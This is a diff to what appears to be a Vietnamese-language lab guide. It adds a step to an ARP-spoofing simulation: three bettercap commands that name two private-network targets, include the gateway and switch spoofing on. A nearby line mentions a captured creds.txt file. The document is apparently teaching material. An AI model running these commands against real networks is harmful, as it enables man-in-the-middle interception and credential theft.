@@ -65,7 +65,10 @@ File ```creds.txt``` xuất hiện và chứa dòng như trên
 # 🧪 Mô phỏng ARP Spoofing
 ## 💡 Mục tiêu
  BƯỚC 1: Khởi động ```bettercap```
-
+ 
+```set arp.spoof.targets 192.168.200.135,192.168.200.2 ```
+```set arp.spoof.gateway true ```
+```arp.spoof on ```
 
 <img src="../assets/src_start_bettercap.png" width="512">
 
